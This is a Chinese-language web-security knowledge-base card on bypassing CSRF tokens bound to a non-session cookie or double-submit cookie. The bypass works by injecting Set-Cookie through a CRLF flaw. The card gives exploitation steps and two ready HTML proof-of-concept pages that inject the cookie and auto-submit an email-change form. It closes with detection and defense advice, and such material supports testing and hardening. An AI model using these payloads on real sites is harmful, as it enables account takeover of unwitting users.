---
id: web-generic-csrf-token-non-session-cookie-set-cookie-injection
title: CSRF Token 绑定非会话 Cookie / 双重提交：借 Set-Cookie 注入写入攻击者 Cookie 后提交匹配 Token
type: scenario
domain: web
path: web/generic/csrf
technique: csrf-token-non-session-cookie-injection
tags:
- web
- csrf
- token
- cookie
- set-cookie
- crlf
- double-submit
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V606
  verified_at: '2026-11-12T18:32:52+08:00'
  notes: 已对照原文《CSRF Token 4/5》节与图28-52核对：单改 csrf/csrfKey 均报 Invalid、跨账户配对成功、搜索处 %0d%0a 注入 Set-Cookie 后两种载荷可用；已修正卡片中“只比较 csrf 与 csrfKey”的不准确表述为服务端 key→token 配对。Token4/5 合并为同一 Cookie 绑定注入手法，原子性判定可接受。PoC 未执行。
url: /docs/web/generic/csrf/web-generic-csrf-token-non-session-cookie-set-cookie-injection/
draft: false
kb_aliases:
- csrfKey 绕过
- 双重提交 Cookie 绕过
- double submit cookie bypass
- Set-Cookie 注入 CSRF
- token tied to non-session cookie
---

## 一句话结论

当 CSRF Token 绑定到“非会话 Cookie”（如独立的 `csrfKey`），或采用把 Token 同时放在 Cookie 与参数中的“双重提交”防御时，只要站点存在可控的 Set-Cookie/CRLF 注入点，攻击者就能把自己的 `csrfKey`/任意 Token 写进受害者浏览器，再提交与 Cookie 匹配的 Token 通过校验。

## 原理

- **非会话 Cookie 绑定（csrfKey）**：应用用 `session` Cookie 识别用户，却把 CSRF Token 与另一个 `csrfKey` Cookie 绑定；校验时服务端凭自己签发的 `csrfKey→csrf` 配对关系验证（两者并非简单相等：单改任一值、或把两账户的 `csrf`/`csrfKey` 混搭都会报 Invalid CSRF token），而 `csrfKey` 不与会话绑定。攻击者登录自己的账户取得一对 `csrf + csrfKey`，但还需要让受害者的浏览器带上攻击者的 `csrfKey`。若站点存在把参数反射进响应头/Set-Cookie 的注入点（如搜索参数中的 CRLF），即可远程设置该 Cookie。
- **双重提交 Cookie**：服务端不保存 Token 状态，只要求请求参数中的 `csrf` 与 Cookie 中的 `csrf` 相同。攻击者甚至不需要合法 Token：只要能用 Set-Cookie 注入把 `csrf` 设成任意值（如 `fake`），表单参数填同一个值即可通过。
- **Cookie 注入来源**：`?search=test%0d%0aSet-Cookie:csrf=fake` 被服务端拼入响应头；或其它 header-injection/CRLF 场景。注入的 Cookie 需能被后续跨站请求携带，必要时加 `SameSite=None`（要求 Secure/HTTPS）。
- **为什么成立**：这两种防御都把“令牌”与一个可被攻击者影响的 Cookie 绑定，而不是与不可伪造的服务器端会话状态绑定；一旦存在 Cookie 写原语，防御即可被自洽地绕过。
- **验证要点**：先确认 Token 与 Cookie 的配对关系（单独改 csrf 或 csrfKey 均报错），再寻找能把 `Set-Cookie` 写入响应的反射点。

## 触发条件

- CSRF 防御为“Token 与非会话 Cookie 绑定”或“双重提交 Cookie”。
- 站点存在可控的 Set-Cookie/CRLF 注入点，能把攻击者指定的 Cookie 写入受害者浏览器。
- 攻击者能注册/登录自己的账户以取得合法 `csrf + csrfKey` 对（非会话 Cookie 绑定场景）。
- 注入的 Cookie 能随攻击请求发送（同站/`SameSite=None`），且目标状态变更接口无其它 Token/Origin 校验。

## 利用步骤

1. 登录两个账户，确认 `csrf` 与 `csrfKey` 必须配对（改其中一个均报 Invalid CSRF token）。
2. 在站点中寻找反射参数进入响应头的位置（搜索、跳转、错误页等），用 `%0d%0aSet-Cookie:...` 测试能否注入 Cookie。
3. 非会话 Cookie 场景：取得攻击者账户的 `csrf`/`csrfKey`；构造表单提交攻击者 `csrf`，同时用 `<img>` 加载注入 URL 把 `csrfKey` 写成攻击者的值，`onerror` 时提交表单。
4. 双重提交场景：用注入 URL 把 `csrf` Cookie 写成任意值（如 `fake; SameSite=None`），表单参数填 `fake`，自动提交。
5. 验证：受害者数据被修改；失败时检查 Cookie 注入是否成功、Cookie 是否被 SameSite 拦截、Token 校验是否还绑定了会话。

## PoC

非会话 Cookie（csrfKey）场景：

```html
<html>
  <body>
    <form action="https://victim.example/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.example">
      <input type="hidden" name="csrf" value="ATTACKER_CSRF">
    </form>
    <img src="https://victim.example/?search=aaa%0d%0aSet-Cookie:%20csrfKey=ATTACKER_CSRFKEY"
         onerror="document.forms[0].submit();">
  </body>
</html>
```

双重提交场景：

```html
<html>
  <body>
    <form action="https://victim.example/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.example">
      <input type="hidden" name="csrf" value="fake">
    </form>
    <img src="https://victim.example/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
         onerror="document.forms[0].submit();">
  </body>
</html>
```

## 变体与关联

- [[web-generic-csrf-token-not-bound-to-session-cross-account-reuse]]：Token 未绑定会话的纯逻辑缺陷。
- [[web-generic-csrf-token-validation-presence-remove-parameter]]、[[web-generic-csrf-token-validation-request-method-get-bypass]]：其它 Token 校验缺陷。
- 关联 CRLF/响应头注入卡片（web/generic/crlf 目录）用于寻找 Set-Cookie 注入点。
- 变体：Cookie 注入可来自 CRLF、header 反射、子域 Cookie 写入、Cookie tossing 等；双重提交也可通过子域覆盖 Cookie。
- 边界：Token 与会话严格绑定、Cookie 只能由服务端安全设置、SameSite 阻止注入 Cookie 随请求发送时链断。

## 检测与防御

- 检测：请求参数反射进响应头/Set-Cookie；CSRF Token 与独立 Cookie 配对；同一 Token 在不同会话/账户使用。
- 防御：Token 必须与服务器端会话绑定，不使用独立非会话 Cookie 或纯双重提交；禁止参数进入响应头，过滤 CRLF；Cookie 设置 `SameSite=Lax/Strict`、`Secure`、`HttpOnly`；校验 Origin/Referer。
- 响应：检查 Set-Cookie 注入日志与被篡改 Cookie 的请求，评估 CSRF 是否被利用。
